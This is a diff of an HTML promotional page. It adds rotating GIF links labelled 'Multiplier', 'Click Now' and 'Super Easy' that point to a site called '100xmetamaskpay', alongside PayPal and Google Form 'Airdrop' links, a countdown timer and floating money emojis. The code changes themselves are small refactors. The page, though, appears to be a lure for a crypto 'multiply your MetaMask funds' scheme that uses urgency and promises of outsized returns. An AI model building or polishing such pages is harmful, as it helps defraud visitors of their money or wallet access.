@@ -138,6 +138,10 @@
     <!-- Scrolling GIFs -->
     <div class="gif-container">
         <a href="https://fclmail.github.io/100xmetamaskpay/" class="active"><img src="metamask.gif" alt="MetaMask"></a>
+        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="multiplier.gif" alt="Multiplier"></a>
+        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="allarewelcome.gif" alt="All Are Welcome"></a>
+        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="clicknow.gif" alt="Click Now"></a>
+        <a href="https://fclmail.github.io/100xmetamaskpay/"><img src="supereasy.gif" alt="Super Easy"></a>
         <a href="https://fclmail.github.io/PAYPAL/"><img src="paypal.gif" alt="PayPal"></a>
         <a href="https://docs.google.com/forms/d/e/1FAIpQLSdV5AnOMcjMyaoaHnTmeMJgKONrU6rHXs_zyf6cOyFrzpThDg/viewform"><img src="airdrop.gif" alt="Airdrop"></a>
     </div>
@@ -159,10 +163,9 @@
                 const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                 const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
                 const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
-                const milliseconds = Math.floor((timeLeft % (1000 * 60)) / 10);
 
                 document.getElementById("timer").innerHTML =  
-                    `${days}d ${hours}h ${minutes}m ${seconds}s `;
+                    `${days}d ${hours}h ${minutes}m ${seconds}s`;
             }, 1000);
         }
         updateTimer();
@@ -172,9 +175,7 @@
         const gifLinks = document.querySelectorAll(".gif-container a");
 
         function showNextGif() {
-            gifLinks.forEach((link, index) => {
-                link.classList.remove("active");
-            });
+            gifLinks.forEach(link => link.classList.remove("active"));
             gifLinks[currentGif].classList.add("active");
 
             currentGif = (currentGif + 1) % gifLinks.length;
@@ -182,7 +183,7 @@
         setInterval(showNextGif, 4000);
 
         // Floating Emojis & Images
-        const emojis = ["😃", "😀", "😄", "🪂", "🪂", "🪂", "💵", "💵", "💵", "💵", "💵", "💰", "🎁", "✅", "✅"];
+        const emojis = ["😃", "💵", "🎁", "✅", "🪂"];
         const images = ["yy.gif", "zz.png", "aa.png", "hh.png"];
 
         function createFloatingElement(type) {
@@ -213,4 +214,5 @@
 
 </body>
 </html>
+
 
